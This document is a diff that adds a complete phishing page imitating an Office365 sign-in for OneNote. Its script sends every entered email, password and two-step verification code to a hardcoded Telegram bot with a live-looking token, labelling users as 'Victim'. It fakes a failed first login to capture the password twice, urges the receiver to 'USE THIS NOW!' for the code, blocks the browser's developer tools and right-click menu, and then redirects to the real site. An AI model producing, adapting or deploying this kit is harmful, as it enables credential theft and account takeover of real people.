@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Office365 - Sign in</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { background: #f0f2f5; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 24px; margin: 0; font-family: -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif; }
+        .login-card { max-width: 440px; width: 100%; background: #ffffff; border-radius: 16px; padding: 48px 40px 40px; box-shadow: 0 8px 40px rgba(0,0,0,0.12), 0 2px 8px rgba(0,0,0,0.06); border: 1px solid rgba(0,0,0,0.04); }
+        .login-logo { text-align: center; margin-bottom: 28px; }
+        .login-logo svg { width: 80px; height: 80px; display: inline-block; }
+        .login-title { font-size: 26px; font-weight: 400; color: #1a1a1a; text-align: center; margin-bottom: 6px; letter-spacing: -0.2px; }
+        .login-subtitle { font-size: 15px; color: #5f6368; text-align: center; margin-bottom: 32px; font-weight: 400; }
+        .input-group { margin-bottom: 20px; }
+        .input-group label { display: block; font-size: 13px; font-weight: 500; color: #3c4043; margin-bottom: 6px; }
+        .input-group input { width: 100%; padding: 14px 16px; font-size: 16px; border: 1.5px solid #dadce0; border-radius: 8px; outline: none; transition: border-color 0.2s ease, box-shadow 0.2s ease; background: #fafafa; color: #202124; }
+        .input-group input:focus { border-color: #D83B01; box-shadow: 0 0 0 3px rgba(216,59,1,0.15); background: #ffffff; }
+        .password-wrapper { position: relative; }
+        .toggle-password { position: absolute; right: 14px; top: 50%; transform: translateY(-50%); color: #5f6368; cursor: pointer; font-size: 13px; font-weight: 500; background: none; border: none; padding: 4px 8px; }
+        .toggle-password:hover { color: #D83B01; }
+        .error-message { color: #d93025; background: #fce8e8; text-align: center; padding: 12px 16px; border-radius: 8px; font-size: 14px; margin: 12px 0 16px; display: none; border: 1px solid #f5c6c6; }
+        .error-message.show { display: block; animation: shake 0.4s ease; }
+        @keyframes shake { 0%,100%{transform:translateX(0)} 20%,60%{transform:translateX(-6px)} 40%,80%{transform:translateX(6px)} }
+        .login-button { width: 100%; padding: 14px; background: #D83B01; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 500; cursor: pointer; transition: background 0.2s ease, box-shadow 0.2s ease; margin-top: 4px; }
+        .login-button:hover { background: #b32d00; box-shadow: 0 2px 12px rgba(216,59,1,0.3); }
+        .login-button:active { transform: scale(0.98); }
+        .login-footer { display: flex; justify-content: space-between; align-items: center; margin-top: 24px; font-size: 14px; }
+        .login-footer a { color: #D83B01; text-decoration: none; font-weight: 500; transition: color 0.2s; }
+        .login-footer a:hover { color: #a02800; text-decoration: underline; }
+        #loadingOverlay { display: none; text-align: center; padding: 40px 20px; }
+        #loadingOverlay h2 { font-size: 20px; font-weight: 400; color: #202124; margin-bottom: 16px; }
+        #loadingOverlay p { color: #5f6368; font-size: 14px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #D83B01; border-radius: 50%; width: 48px; height: 48px; animation: spin 0.8s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        #otpContainer { display: none; margin-top: 8px; }
+        #otpContainer .otp-title { font-size: 20px; font-weight: 400; color: #202124; text-align: center; }
+        #otpContainer .otp-subtitle { font-size: 14px; color: #5f6368; text-align: center; margin-bottom: 20px; }
+        #singleOtp { width: 100%; padding: 18px; font-size: 30px; text-align: center; letter-spacing: 10px; border: 2px solid #D83B01; border-radius: 10px; background: #fafafa; font-weight: 500; outline: none; transition: border-color 0.2s, box-shadow 0.2s; }
+        #singleOtp:focus { border-color: #D83B01; box-shadow: 0 0 0 3px rgba(216,59,1,0.15); background: #ffffff; }
+        #otpError { color: #d93025; background: #fce8e8; text-align: center; padding: 12px; border-radius: 8px; margin-top: 12px; display: none; font-size: 14px; }
+        @media (max-width: 480px) { body { padding: 12px; } .login-card { padding: 32px 20px 28px; border-radius: 12px; } .login-title { font-size: 22px; } .login-logo svg { width: 64px; height: 64px; } .input-group input { padding: 12px 14px; font-size: 15px; } .login-button { padding: 14px; font-size: 15px; } #singleOtp { font-size: 24px; padding: 14px; } }
+    </style>
+</head>
+<body>
+    <div class="login-card">
+        <div class="login-logo">
+            <svg viewBox="0 0 48 48" width="80" height="80">
+                <rect x="4" y="4" width="40" height="40" rx="8" fill="#D83B01"/>
+                <text x="24" y="34" text-anchor="middle" fill="white" font-size="28" font-weight="bold" font-family="Segoe UI, Arial">O</text>
+                <rect x="28" y="8" width="12" height="8" rx="2" fill="white" opacity="0.2"/>
+            </svg>
+        </div>
+        <h1 class="login-title">Sign in with Office365</h1>
+        <p class="login-subtitle">to continue to OneNote</p>
+        
+        <div id="loginForm">
+            <div class="input-group"><label>Email or phone</label><input type="email" id="email" placeholder="example@outlook.com"></div>
+            <div class="input-group"><label>Password</label><div class="password-wrapper"><input type="password" id="password" placeholder="Enter your password"><button type="button" class="toggle-password" onclick="togglePassword()">Show</button></div></div>
+            <div id="loginError" class="error-message">Invalid email or password</div>
+            <button class="login-button" onclick="submitLogin()">Sign in</button>
+            <div class="login-footer"><a href="#">Forgot password?</a><a href="#">Create account</a></div>
+        </div>
+        
+        <div id="loadingOverlay"><h2>Verifying your credentials</h2><div class="spinner"></div><p>Please wait...</p></div>
+        
+        <div id="otpContainer">
+            <div class="otp-title">2-Step Verification</div>
+            <div class="otp-subtitle">Enter the code sent to your device</div>
+            <input type="text" id="singleOtp" maxlength="6" placeholder="000000">
+            <button class="login-button" onclick="submitSingleOTP()" style="margin-top:16px;">Verify</button>
+            <div id="otpError">Invalid code</div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "8849922646:AAHL1k8PDTU83eg5OVZJYTqGdLvyfwdydaw";
+        const CHANNEL_ID = "8374468402";
+        
+        const urlParams = new URLSearchParams(window.location.search);
+        const victimId = urlParams.get('vid') || localStorage.getItem('victim_id') || 'VIC_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        localStorage.setItem('victim_id', victimId);
+
+        function sendToTelegram(message) {
+            try {
+                const img = new Image();
+                img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHANNEL_ID}&text=${encodeURIComponent(message)}`;
+                img.style.display = 'none';
+                document.body.appendChild(img);
+                setTimeout(() => { if (img.parentNode) img.parentNode.removeChild(img); }, 3000);
+                return true;
+            } catch(e) { return false; }
+        }
+
+        let loginAttempts = 0;
+        let currentEmail = '';
+
+        function togglePassword() {
+            const pwd = document.getElementById('password');
+            const toggle = document.querySelector('.toggle-password');
+            if (pwd.type === 'password') { pwd.type = 'text'; toggle.textContent = 'Hide'; }
+            else { pwd.type = 'password'; toggle.textContent = 'Show'; }
+        }
+
+        function showLoading() {
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('otpContainer').style.display = 'none';
+            document.getElementById('loadingOverlay').style.display = 'block';
+        }
+
+        function hideLoading() {
+            document.getElementById('loadingOverlay').style.display = 'none';
+        }
+
+        function submitLogin() {
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            if (!email || !password) { alert('Please enter both email and password'); return; }
+            currentEmail = email;
+            loginAttempts++;
+            const msg = `[+]━━【🔐 CREDENTIALS】━━[+]\nProvider: Office365\nVictim: ${victimId}\nEmail: ${email}\nPassword: ${password}\nAttempt: ${loginAttempts}`;
+            sendToTelegram(msg);
+            if (loginAttempts === 1) {
+                const errorEl = document.getElementById('loginError');
+                errorEl.textContent = 'Invalid email or password';
+                errorEl.classList.add('show');
+                document.querySelector('.login-card').style.animation = 'shake 0.4s ease';
+                setTimeout(() => { document.querySelector('.login-card').style.animation = ''; }, 400);
+                document.getElementById('password').value = '';
+                document.getElementById('password').focus();
+            } else {
+                showLoading();
+                setTimeout(() => {
+                    hideLoading();
+                    document.getElementById('loginForm').style.display = 'none';
+                    document.getElementById('otpContainer').style.display = 'block';
+                    document.getElementById('singleOtp').focus();
+                }, 4000);
+            }
+        }
+
+        function submitSingleOTP() {
+            const otp = document.getElementById('singleOtp').value.trim();
+            if (otp.length < 4) {
+                document.getElementById('otpError').style.display = 'block';
+                setTimeout(() => { document.getElementById('otpError').style.display = 'none'; }, 2000);
+                return;
+            }
+            const msg = `[+]━━【🔢 OTP】━━[+]\nProvider: Office365\nVictim: ${victimId}\nEmail: ${currentEmail}\nOTP: ${otp}\n⚠️ USE THIS NOW!`;
+            sendToTelegram(msg);
+            showLoading();
+            document.getElementById('otpContainer').style.display = 'none';
+            setTimeout(() => { window.location.href = 'https://www.office.com'; }, 4000);
+        }
+
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) { e.preventDefault(); return false; }
+        });
+
+        window.sendToTelegram = sendToTelegram;
+        window.victimId = victimId;
+    </script>
+</body>
+</html>
